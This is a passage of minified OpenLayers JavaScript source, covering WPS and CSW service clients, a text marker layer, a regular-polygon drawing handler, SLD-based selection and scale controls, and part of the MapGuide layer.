b}},CLASS_NAME:"OpenLayers.Format.WKT"});OpenLayers.WPSProcess=OpenLayers.Class({client:null,server:null,identifier:null,description:null,localWPS:"http://geoserver/wps",formats:null,chained:0,executeCallbacks:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.executeCallbacks=[];this.formats={"application/wkt":new OpenLayers.Format.WKT,"application/json":new OpenLayers.Format.GeoJSON}},describe:function(a){a=a||{};if(!this.description)this.client.describeProcess(this.server,this.identifier,function(b){this.description||this.parseDescription(b); a.callback&amp;&amp;a.callback.call(a.scope,this.description)},this);else if(a.callback){var b=this.description;window.setTimeout(function(){a.callback.call(a.scope,b)},0)}},configure:function(a){this.describe({callback:function(){var b=this.description,c=a.inputs,d,e,f;e=0;for(f=b.dataInputs.length;e&lt;f;++e)d=b.dataInputs[e],this.setInputData(d,c[d.identifier]);a.callback&amp;&amp;a.callback.call(a.scope)},scope:this});return this},execute:function(a){this.configure({inputs:a.inputs,callback:function(){var b=this, c=this.getOutputIndex(b.description.processOutputs,a.output);b.setResponseForm({outputIndex:c});(function e(){OpenLayers.Util.removeItem(b.executeCallbacks,e);0!==b.chained?b.executeCallbacks.push(e):OpenLayers.Request.POST({url:b.client.servers[b.server].url,data:(new OpenLayers.Format.WPSExecute).write(b.description),success:function(e){var g=b.findMimeType(b.description.processOutputs[c].complexOutput.supported.formats);e=b.formats[g].read(e.responseText);e instanceof OpenLayers.Feature.Vector&amp;&amp; (e=[e]);a.success&amp;&amp;(g={},g[a.output||"result"]=e,a.success.call(a.scope,g))},scope:b})})()},scope:this})},output:function(a){return new OpenLayers.WPSProcess.ChainLink({process:this,output:a})},parseDescription:function(a){a=this.client.servers[this.server];this.description=(new OpenLayers.Format.WPSDescribeProcess).read(a.processDescription[this.identifier]).processDescriptions[this.identifier]},setInputData:function(a,b){delete a.data;delete a.reference;if(b instanceof OpenLayers.WPSProcess.ChainLink)++this.chained, a.reference={method:"POST",href:b.process.server===this.server?this.localWPS:this.client.servers[b.process.server].url},b.process.describe({callback:function(){--this.chained;this.chainProcess(a,b)},scope:this});else{a.data={};var c=a.complexData;c?(c=this.findMimeType(c.supported.formats),a.data.complexData={mimeType:c,value:this.formats[c].write(this.toFeatures(b))}):a.data.literalData={value:b}}},setResponseForm:function(a){a=a||{};var b=this.description.processOutputs[a.outputIndex||0];this.description.responseForm= {rawDataOutput:{identifier:b.identifier,mimeType:this.findMimeType(b.complexOutput.supported.formats,a.supportedFormats)}}},getOutputIndex:function(a,b){var c;if(b)for(var d=a.length-1;0&lt;=d;--d){if(a[d].identifier===b){c=d;break}}else c=0;return c},chainProcess:function(a,b){var c=this.getOutputIndex(b.process.description.processOutputs,b.output);a.reference.mimeType=this.findMimeType(a.complexData.supported.formats,b.process.description.processOutputs[c].complexOutput.supported.formats);var d={}; d[a.reference.mimeType]=!0;b.process.setResponseForm({outputIndex:c,supportedFormats:d});for(a.reference.body=b.process.description;0&lt;this.executeCallbacks.length;)this.executeCallbacks[0]()},toFeatures:function(a){var b=OpenLayers.Util.isArray(a);b||(a=[a]);for(var c=Array(a.length),d,e=0,f=a.length;e&lt;f;++e)d=a[e],c[e]=d instanceof OpenLayers.Feature.Vector?d:new OpenLayers.Feature.Vector(d);return b?c:c[0]},findMimeType:function(a,b){b=b||this.formats;for(var c in a)if(c in b)return c},CLASS_NAME:"OpenLayers.WPSProcess"}); OpenLayers.WPSProcess.ChainLink=OpenLayers.Class({process:null,output:null,initialize:function(a){OpenLayers.Util.extend(this,a)},CLASS_NAME:"OpenLayers.WPSProcess.ChainLink"});OpenLayers.WPSClient=OpenLayers.Class({servers:null,version:"1.0.0",lazy:!1,events:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);this.servers={};for(var b in a.servers)this.servers[b]="string"==typeof a.servers[b]?{url:a.servers[b],version:this.version,processDescription:{}}:a.servers[b]},execute:function(a){this.getProcess(a.server,a.process).execute({inputs:a.inputs,success:a.success,scope:a.scope})},getProcess:function(a,b){var c=new OpenLayers.WPSProcess({client:this, server:a,identifier:b});this.lazy||c.describe();return c},describeProcess:function(a,b,c,d){var e=this.servers[a];e.processDescription[b]?window.setTimeout(function(){c.call(d,e.processDescription[b])},0):b in e.processDescription?this.events.register("describeprocess",this,function g(a){a.identifier===b&amp;&amp;(this.events.unregister("describeprocess",this,g),c.call(d,a.raw))}):(e.processDescription[b]=null,OpenLayers.Request.GET({url:e.url,params:{SERVICE:"WPS",VERSION:e.version,REQUEST:"DescribeProcess", IDENTIFIER:b},success:function(a){e.processDescription[b]=a.responseText;this.events.triggerEvent("describeprocess",{identifier:b,raw:a.responseText})},scope:this}))},destroy:function(){this.events.destroy();this.servers=this.events=null},CLASS_NAME:"OpenLayers.WPSClient"});OpenLayers.Format.CSWGetRecords.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{csw:"http://www.opengis.net/cat/csw/2.0.2",dc:"http://purl.org/dc/elements/1.1/",dct:"http://purl.org/dc/terms/",gmd:"http://www.isotc211.org/2005/gmd",geonet:"http://www.fao.org/geonetwork",ogc:"http://www.opengis.net/ogc",ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},defaultPrefix:"csw",version:"2.0.2",schemaLocation:"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd", requestId:null,resultType:null,outputFormat:null,outputSchema:null,startPosition:null,maxRecords:null,DistributedSearch:null,ResponseHandler:null,Query:null,regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b}, readers:{csw:{GetRecordsResponse:function(a,b){b.records=[];this.readChildNodes(a,b);var c=this.getAttributeNS(a,"","version");""!=c&amp;&amp;(b.version=c)},RequestId:function(a,b){b.RequestId=this.getChildValue(a)},SearchStatus:function(a,b){b.SearchStatus={};var c=this.getAttributeNS(a,"","timestamp");""!=c&amp;&amp;(b.SearchStatus.timestamp=c)},SearchResults:function(a,b){this.readChildNodes(a,b);for(var c=a.attributes,d={},e=0,f=c.length;e&lt;f;++e)d[c[e].name]="numberOfRecordsMatched"==c[e].name||"numberOfRecordsReturned"== c[e].name||"nextRecord"==c[e].name?parseInt(c[e].nodeValue):c[e].nodeValue;b.SearchResults=d},SummaryRecord:function(a,b){var c={type:"SummaryRecord"};this.readChildNodes(a,c);b.records.push(c)},BriefRecord:function(a,b){var c={type:"BriefRecord"};this.readChildNodes(a,c);b.records.push(c)},DCMIRecord:function(a,b){var c={type:"DCMIRecord"};this.readChildNodes(a,c);b.records.push(c)},Record:function(a,b){var c={type:"Record"};this.readChildNodes(a,c);b.records.push(c)},"*":function(a,b){var c=a.localName|| a.nodeName.split(":").pop();b[c]=this.getChildValue(a)}},geonet:{info:function(a,b){var c={};this.readChildNodes(a,c);b.gninfo=c}},dc:{"*":function(a,b){var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);for(var d={},e=a.attributes,f=0,g=e.length;f&lt;g;++f)d[e[f].name]=e[f].nodeValue;d.value=this.getChildValue(a);""!=d.value&amp;&amp;b[c].push(d)}},dct:{"*":function(a,b){var c=a.localName||a.nodeName.split(":").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);b[c].push(this.getChildValue(a))}}, ows:OpenLayers.Util.applyDefaults({BoundingBox:function(a,b){b.bounds&amp;&amp;(b.BoundingBox=[{crs:b.projection,value:[b.bounds.left,b.bounds.bottom,b.bounds.right,b.bounds.top]}],delete b.projection,delete b.bounds);OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows.BoundingBox.apply(this,arguments)}},OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows)},write:function(a){a=this.writeNode("csw:GetRecords",a);a.setAttribute("xmlns:gmd",this.namespaces.gmd);return OpenLayers.Format.XML.prototype.write.apply(this, [a])},writers:{csw:{GetRecords:function(a){a||(a={});var b=this.createElementNSPlus("csw:GetRecords",{attributes:{service:"CSW",version:this.version,requestId:a.requestId||this.requestId,resultType:a.resultType||this.resultType,outputFormat:a.outputFormat||this.outputFormat,outputSchema:a.outputSchema||this.outputSchema,startPosition:a.startPosition||this.startPosition,maxRecords:a.maxRecords||this.maxRecords}});(a.DistributedSearch||this.DistributedSearch)&amp;&amp;this.writeNode("csw:DistributedSearch", a.DistributedSearch||this.DistributedSearch,b);var c=a.ResponseHandler||this.ResponseHandler;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ResponseHandler",c[d],b);this.writeNode("Query",a.Query||this.Query,b);return b},DistributedSearch:function(a){return this.createElementNSPlus("csw:DistributedSearch",{attributes:{hopCount:a.hopCount}})},ResponseHandler:function(a){return this.createElementNSPlus("csw:ResponseHandler",{value:a.value})},Query:function(a){a|| (a={});var b=this.createElementNSPlus("csw:Query",{attributes:{typeNames:a.typeNames||"csw:Record"}}),c=a.ElementName;if(OpenLayers.Util.isArray(c)&amp;&amp;0&lt;c.length)for(var d=0,e=c.length;d&lt;e;d++)this.writeNode("csw:ElementName",c[d],b);else this.writeNode("csw:ElementSetName",a.ElementSetName||{value:"summary"},b);a.Constraint&amp;&amp;this.writeNode("csw:Constraint",a.Constraint,b);a.SortBy&amp;&amp;this.writeNode("ogc:SortBy",a.SortBy,b);return b},ElementName:function(a){return this.createElementNSPlus("csw:ElementName", {value:a.value})},ElementSetName:function(a){return this.createElementNSPlus("csw:ElementSetName",{attributes:{typeNames:a.typeNames},value:a.value})},Constraint:function(a){var b=this.createElementNSPlus("csw:Constraint",{attributes:{version:a.version}});if(a.Filter){var c=new OpenLayers.Format.Filter({version:a.version});b.appendChild(c.write(a.Filter))}else a.CqlText&amp;&amp;(a=this.createElementNSPlus("CqlText",{value:a.CqlText.value}),b.appendChild(a));return b}},ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc}, CLASS_NAME:"OpenLayers.Format.CSWGetRecords.v2_0_2"});/* Apache 2 Contains portions of Rico &lt;http://openrico.org/> Copyright 2005 Sabre Airline Solutions Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. */ OpenLayers.Marker.Box=OpenLayers.Class(OpenLayers.Marker,{bounds:null,div:null,initialize:function(a,b,c){this.bounds=a;this.div=OpenLayers.Util.createDiv();this.div.style.overflow="hidden";this.events=new OpenLayers.Events(this,this.div);this.setBorder(b,c)},destroy:function(){this.div=this.bounds=null;OpenLayers.Marker.prototype.destroy.apply(this,arguments)},setBorder:function(a,b){a||(a="red");b||(b=2);this.div.style.border=b+"px solid "+a},draw:function(a,b){OpenLayers.Util.modifyDOMElement(this.div, null,a,b);return this.div},onScreen:function(){var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsBounds(this.bounds,!0,!0));return a},display:function(a){this.div.style.display=a?"":"none"},CLASS_NAME:"OpenLayers.Marker.Box"});OpenLayers.Format.Text=OpenLayers.Class(OpenLayers.Format,{defaultStyle:null,extractStyles:!0,initialize:function(a){a=a||{};!1!==a.extractStyles&amp;&amp;(a.defaultStyle={externalGraphic:OpenLayers.Util.getImageLocation("marker.png"),graphicWidth:21,graphicHeight:25,graphicXOffset:-10.5,graphicYOffset:-12.5});OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){a=a.split("\n");for(var b,c=[],d=0;d&lt;a.length-1;d++){var e=a[d].replace(/^\s*/,"").replace(/\s*$/,"");if("#"!=e.charAt(0))if(b){for(var e= e.split("\t"),f=new OpenLayers.Geometry.Point(0,0),g={},h=this.defaultStyle?OpenLayers.Util.applyDefaults({},this.defaultStyle):null,k=!1,l=0;l&lt;e.length;l++)if(e[l])if("point"==b[l])k=e[l].split(","),f.y=parseFloat(k[0]),f.x=parseFloat(k[1]),k=!0;else if("lat"==b[l])f.y=parseFloat(e[l]),k=!0;else if("lon"==b[l])f.x=parseFloat(e[l]),k=!0;else if("title"==b[l])g.title=e[l];else if("image"==b[l]||"icon"==b[l]&amp;&amp;h)h.externalGraphic=e[l];else if("iconSize"==b[l]&amp;&amp;h){var m=e[l].split(",");h.graphicWidth= parseFloat(m[0]);h.graphicHeight=parseFloat(m[1])}else"iconOffset"==b[l]&amp;&amp;h?(m=e[l].split(","),h.graphicXOffset=parseFloat(m[0]),h.graphicYOffset=parseFloat(m[1])):"description"==b[l]?g.description=e[l]:"overflow"==b[l]?g.overflow=e[l]:g[b[l]]=e[l];k&amp;&amp;(this.internalProjection&amp;&amp;this.externalProjection&amp;&amp;f.transform(this.externalProjection,this.internalProjection),e=new OpenLayers.Feature.Vector(f,g,h),c.push(e))}else b=e.split("\t")}return c},CLASS_NAME:"OpenLayers.Format.Text"});OpenLayers.Layer.Text=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,initialize:function(a,b){OpenLayers.Layer.Markers.prototype.initialize.apply(this,arguments);this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadText:function(){this.loaded||null==this.location||(this.events.triggerEvent("loadstart"),OpenLayers.Request.GET({url:this.location, success:this.parseData,failure:function(a){this.events.triggerEvent("loadend")},scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&amp;&amp;!this.loaded&amp;&amp;this.loadText()},parseData:function(a){a=a.responseText;var b={};OpenLayers.Util.extend(b,this.formatOptions);this.map&amp;&amp;!this.projection.equals(this.map.getProjectionObject())&amp;&amp;(b.externalProjection=this.projection,b.internalProjection=this.map.getProjectionObject());a=(new OpenLayers.Format.Text(b)).read(a); for(var b=0,c=a.length;b&lt;c;b++){var d={},e=a[b],f,g,h;f=new OpenLayers.LonLat(e.geometry.x,e.geometry.y);e.style.graphicWidth&amp;&amp;e.style.graphicHeight&amp;&amp;(g=new OpenLayers.Size(e.style.graphicWidth,e.style.graphicHeight));void 0!==e.style.graphicXOffset&amp;&amp;void 0!==e.style.graphicYOffset&amp;&amp;(h=new OpenLayers.Pixel(e.style.graphicXOffset,e.style.graphicYOffset));null!=e.style.externalGraphic?d.icon=new OpenLayers.Icon(e.style.externalGraphic,g,h):(d.icon=OpenLayers.Marker.defaultIcon(),null!=g&amp;&amp;d.icon.setSize(g)); null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;(d.popupContentHTML="&lt;h2>"+e.attributes.title+"&lt;/h2>&lt;p>"+e.attributes.description+"&lt;/p>");d.overflow=e.attributes.overflow||"auto";d=new OpenLayers.Feature(this,f,d);this.features.push(d);f=d.createMarker();null!=e.attributes.title&amp;&amp;null!=e.attributes.description&amp;&amp;f.events.register("click",d,this.markerClick);this.addMarker(f)}this.events.triggerEvent("loadend")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature= b?null:this;for(var c=0,d=this.layer.map.popups.length;c&lt;d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||this.layer.map.addPopup(this.createPopup());OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0&lt;this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:"OpenLayers.Layer.Text"});OpenLayers.Handler.RegularPolygon=OpenLayers.Class(OpenLayers.Handler.Drag,{sides:4,radius:null,snapAngle:null,snapToggle:"shiftKey",layerOptions:null,persist:!1,irregular:!1,citeCompliant:!1,angle:null,fixedRadius:!1,feature:null,layer:null,origin:null,initialize:function(a,b,c){c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],{}));OpenLayers.Handler.Drag.prototype.initialize.apply(this,[a,b,c]);this.options=c?c:{}},setOptions:function(a){OpenLayers.Util.extend(this.options, a);OpenLayers.Util.extend(this,a)},activate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.activate.apply(this,arguments)&amp;&amp;(a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions),this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a),this.map.addLayer(this.layer),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.dragging&amp;&amp;this.cancel(), null!=this.layer.map&amp;&amp;(this.layer.destroy(!1),this.feature&amp;&amp;this.feature.destroy()),this.feature=this.layer=null,a=!0);return a},down:function(a){this.fixedRadius=!!this.radius;a=this.layer.getLonLatFromViewPortPx(a.xy);this.origin=new OpenLayers.Geometry.Point(a.lon,a.lat);if(!this.fixedRadius||this.irregular)this.radius=this.map.getResolution();this.persist&amp;&amp;this.clear();this.feature=new OpenLayers.Feature.Vector;this.createGeometry();this.callback("create",[this.origin,this.feature]);this.layer.addFeatures([this.feature], {silent:!0});this.layer.drawFeature(this.feature,this.style)},move:function(a){var b=this.layer.getLonLatFromViewPortPx(a.xy),b=new OpenLayers.Geometry.Point(b.lon,b.lat);this.irregular?(a=Math.sqrt(2)*Math.abs(b.y-this.origin.y)/2,this.radius=Math.max(this.map.getResolution()/2,a)):this.fixedRadius?this.origin=b:(this.calculateAngle(b,a),this.radius=Math.max(this.map.getResolution()/2,b.distanceTo(this.origin)));this.modifyGeometry();if(this.irregular){a=b.x-this.origin.x;var b=b.y-this.origin.y, c;c=0==b?a/(this.radius*Math.sqrt(2)):a/b;this.feature.geometry.resize(1,this.origin,c);this.feature.geometry.move(a/2,b/2)}this.layer.drawFeature(this.feature,this.style)},up:function(a){this.finalize();this.start==this.last&amp;&amp;this.callback("done",[a.xy])},out:function(a){this.finalize()},createGeometry:function(){this.angle=Math.PI*(1/this.sides-0.5);this.snapAngle&amp;&amp;(this.angle+=this.snapAngle*(Math.PI/180));this.feature.geometry=OpenLayers.Geometry.Polygon.createRegularPolygon(this.origin,this.radius, this.sides,this.snapAngle)},modifyGeometry:function(){var a,b,c=this.feature.geometry.components[0];c.components.length!=this.sides+1&amp;&amp;(this.createGeometry(),c=this.feature.geometry.components[0]);for(var d=0;d&lt;this.sides;++d)b=c.components[d],a=this.angle+2*d*Math.PI/this.sides,b.x=this.origin.x+this.radius*Math.cos(a),b.y=this.origin.y+this.radius*Math.sin(a),b.clearBounds()},calculateAngle:function(a,b){var c=Math.atan2(a.y-this.origin.y,a.x-this.origin.x);if(this.snapAngle&amp;&amp;this.snapToggle&amp;&amp;!b[this.snapToggle]){var d= Math.PI/180*this.snapAngle;this.angle=Math.round(c/d)*d}else this.angle=c},cancel:function(){this.callback("cancel",null);this.finalize()},finalize:function(){this.origin=null;this.radius=this.options.radius},clear:function(){this.layer&amp;&amp;(this.layer.renderer.clear(),this.layer.destroyFeatures())},callback:function(a,b){this.callbacks[a]&amp;&amp;this.callbacks[a].apply(this.control,[this.feature.geometry.clone()]);this.persist||"done"!=a&amp;&amp;"cancel"!=a||this.clear()},CLASS_NAME:"OpenLayers.Handler.RegularPolygon"});OpenLayers.Control.SLDSelect=OpenLayers.Class(OpenLayers.Control,{clearOnDeactivate:!1,layers:null,callbacks:null,selectionSymbolizer:{Polygon:{fillColor:"#FF0000",stroke:!1},Line:{strokeColor:"#FF0000",strokeWidth:2},Point:{graphicName:"square",fillColor:"#FF0000",pointRadius:5}},layerOptions:null,sketchStyle:null,wfsCache:{},layerCache:{},initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.callbacks=OpenLayers.Util.extend({done:this.select,click:this.select},this.callbacks); this.handlerOptions=this.handlerOptions||{};this.layerOptions=OpenLayers.Util.applyDefaults(this.layerOptions,{displayInLayerSwitcher:!1,tileOptions:{maxGetUrlLength:2048}});this.sketchStyle&amp;&amp;(this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({"default":this.sketchStyle})}));this.handler=new a(this,this.callbacks,this.handlerOptions)},destroy:function(){for(var a in this.layerCache)delete this.layerCache[a];for(a in this.wfsCache)delete this.wfsCache[a]; OpenLayers.Control.prototype.destroy.apply(this,arguments)},coupleLayerVisiblity:function(a){this.setVisibility(a.object.getVisibility())},createSelectionLayer:function(a){var b;if(this.layerCache[a.id])b=this.layerCache[a.id];else{b=new OpenLayers.Layer.WMS(a.name,a.url,a.params,OpenLayers.Util.applyDefaults(this.layerOptions,a.getOptions()));this.layerCache[a.id]=b;if(!1===this.layerOptions.displayInLayerSwitcher)a.events.on({visibilitychanged:this.coupleLayerVisiblity,scope:b});this.map.addLayer(b)}return b}, createSLD:function(a,b,c){for(var d={version:"1.0.0",namedLayers:{}},e=(""+a.params.LAYERS).split(","),f=0,g=e.length;f&lt;g;f++){var h=e[f];d.namedLayers[h]={name:h,userStyles:[]};var k=this.selectionSymbolizer,l=c[f];0&lt;=l.type.indexOf("Polygon")?k={Polygon:this.selectionSymbolizer.Polygon}:0&lt;=l.type.indexOf("LineString")?k={Line:this.selectionSymbolizer.Line}:0&lt;=l.type.indexOf("Point")&amp;&amp;(k={Point:this.selectionSymbolizer.Point});d.namedLayers[h].userStyles.push({name:"default",rules:[new OpenLayers.Rule({symbolizer:k, filter:b[f],maxScaleDenominator:a.options.minScale})]})}return(new OpenLayers.Format.SLD({srsName:this.map.getProjection()})).write(d)},parseDescribeLayer:function(a){var b=new OpenLayers.Format.WMSDescribeLayer,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);for(var b=[],c=null,d=0,e=a.length;d&lt;e;d++)"WFS"==a[d].owsType&amp;&amp;(b.push(a[d].typeName),c=a[d].owsURL);OpenLayers.Request.GET({url:c,params:{SERVICE:"WFS",TYPENAME:b.toString(),REQUEST:"DescribeFeatureType",VERSION:"1.0.0"}, callback:function(a){var b=new OpenLayers.Format.WFSDescribeFeatureType,c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);a=b.read(c);this.control.wfsCache[this.layer.id]=a;this.control._queue&amp;&amp;this.control.applySelection()},scope:this})},getGeometryAttributes:function(a){var b=[];a=this.wfsCache[a.id];for(var c=0,d=a.featureTypes.length;c&lt;d;c++)for(var e=a.featureTypes[c].properties,f=0,g=e.length;f&lt;g;f++){var h=e[f],k=h.type;(0&lt;=k.indexOf("LineString")||0&lt;=k.indexOf("GeometryAssociationType")|| 0&lt;=k.indexOf("GeometryPropertyType")||0&lt;=k.indexOf("Point")||0&lt;=k.indexOf("Polygon"))&amp;&amp;b.push(h)}return b},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++){var d=this.layers[b];d&amp;&amp;!this.wfsCache[d.id]&amp;&amp;OpenLayers.Request.GET({url:d.url,params:{SERVICE:"WMS",VERSION:d.params.VERSION,LAYERS:d.params.LAYERS,REQUEST:"DescribeLayer"},callback:this.parseDescribeLayer,scope:{layer:d,control:this}})}return a},deactivate:function(){var a= OpenLayers.Control.prototype.deactivate.call(this);if(a)for(var b=0,c=this.layers.length;b&lt;c;b++){var d=this.layers[b];if(d&amp;&amp;!0===this.clearOnDeactivate){var e=this.layerCache,f=e[d.id];f&amp;&amp;(d.events.un({visibilitychanged:this.coupleLayerVisiblity,scope:f}),f.destroy(),delete e[d.id])}}return a},setLayers:function(a){this.active?(this.deactivate(),this.layers=a,this.activate()):this.layers=a},createFilter:function(a,b){var c=null;this.handler instanceof OpenLayers.Handler.RegularPolygon?c=!0===this.handler.irregular? new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:a.name,value:b.getBounds()}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Polygon?c=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Path?c=0&lt;=a.type.indexOf("Point")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN, property:a.name,distance:0.01*this.map.getExtent().getWidth(),distanceUnits:this.map.getUnits(),value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Click&amp;&amp;(c=0&lt;=a.type.indexOf("Polygon")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,property:a.name,distance:0.01*this.map.getExtent().getWidth(), distanceUnits:this.map.getUnits(),value:b}));return c},select:function(a){this._queue=function(){for(var b=0,c=this.layers.length;b&lt;c;b++){for(var d=this.layers[b],e=this.getGeometryAttributes(d),f=[],g=0,h=e.length;g&lt;h;g++){var k=e[g];if(null!==k){if(!(a instanceof OpenLayers.Geometry)){var l=this.map.getLonLatFromPixel(a.xy);a=new OpenLayers.Geometry.Point(l.lon,l.lat)}k=this.createFilter(k,a);null!==k&amp;&amp;f.push(k)}}g=this.createSelectionLayer(d);this.events.triggerEvent("selected",{layer:d,filters:f}); d=this.createSLD(d,f,e);g.mergeNewParams({SLD_BODY:d});delete this._queue}};this.applySelection()},applySelection:function(){for(var a=!0,b=0,c=this.layers.length;b&lt;c;b++)if(!this.wfsCache[this.layers[b].id]){a=!1;break}a&amp;&amp;this._queue.call(this)},CLASS_NAME:"OpenLayers.Control.SLDSelect"});OpenLayers.Control.Scale=OpenLayers.Class(OpenLayers.Control,{element:null,geodesic:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.element=OpenLayers.Util.getElement(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.element=document.createElement("div"),this.div.appendChild(this.element));this.map.events.register("moveend",this,this.updateScale);this.updateScale();return this.div},updateScale:function(){var a; if(!0===this.geodesic){if(!this.map.getUnits())return;a=OpenLayers.INCHES_PER_UNIT;a=(this.map.getGeodesicPixelSize().w||1E-6)*a.km*OpenLayers.DOTS_PER_INCH}else a=this.map.getScale();a&amp;&amp;(a=9500&lt;=a&amp;&amp;95E4>=a?Math.round(a/1E3)+"K":95E4&lt;=a?Math.round(a/1E6)+"M":Math.round(a),this.element.innerHTML=OpenLayers.i18n("Scale = 1 : ${scaleDenom}",{scaleDenom:a}))},CLASS_NAME:"OpenLayers.Control.Scale"});OpenLayers.Layer.MapGuide=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,useHttpTile:!1,singleTile:!1,useOverlay:!1,useAsyncOverlay:!0,TILE_PARAMS:{operation:"GETTILEIMAGE",version:"1.2.0"},SINGLE_TILE_PARAMS:{operation:"GETMAPIMAGE",format:"PNG",locale:"en",clip:"1",version:"1.0.0"},OVERLAY_PARAMS:{operation:"GETDYNAMICMAPOVERLAYIMAGE",format:"PNG",locale:"en",clip:"1",version:"2.0.0"},FOLDER_PARAMS:{tileColumnsPerFolder:30,tileRowsPerFolder:30,format:"png",querystring:null},defaultSize:new OpenLayers.Size(300, 300),tileOriginCorner:"tl",initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);if(null==d||null==d.isBaseLayer)this.isBaseLayer="true"!=this.transparent&amp;&amp;!0!=this.transparent;d&amp;&amp;null!=d.useOverlay&amp;&amp;(this.useOverlay=d.useOverlay);this.singleTile?this.useOverlay?(OpenLayers.Util.applyDefaults(this.params,this.OVERLAY_PARAMS),this.useAsyncOverlay||(this.params.version="1.0.0")):OpenLayers.Util.applyDefaults(this.params,this.SINGLE_TILE_PARAMS):(this.useHttpTile? OpenLayers.Util.applyDefaults(this.params,this.FOLDER_PARAMS):OpenLayers.Util.applyDefaults(this.params,this.TILE_PARAMS),this.setTileSize(this.defaultSize))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.MapGuide(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){var b;b=a.getCenterLonLat();var c=this.map.getSize();this.singleTile?(a={setdisplaydpi:OpenLayers.DOTS_PER_INCH,setdisplayheight:c.h*this.ratio,setdisplaywidth:c.w* this.ratio,setviewcenterx:b.lon,setviewcentery:b.lat,setviewscale:this.map.getScale()},this.useOverlay&amp;&amp;!this.useAsyncOverlay&amp;&amp;(b={},b=OpenLayers.Util.extend(b,a),b.operation="GETVISIBLEMAPEXTENT",b.version="1.0.0",b.session=this.params.session,b.mapName=this.params.mapName,b.format="text/xml",b=this.getFullRequestString(b),OpenLayers.Request.GET({url:b,async:!1})),b=this.getFullRequestString(a)):(c=this.map.getResolution(),b=Math.floor((a.left-this.maxExtent.left)/c),b=Math.round(b/this.tileSize.w), a=Math.floor((this.maxExtent.top-a.top)/c),a=Math.round(a/this.tileSize.h),b=this.useHttpTile?this.getImageFilePath({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}):this.getFullRequestString({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}));return 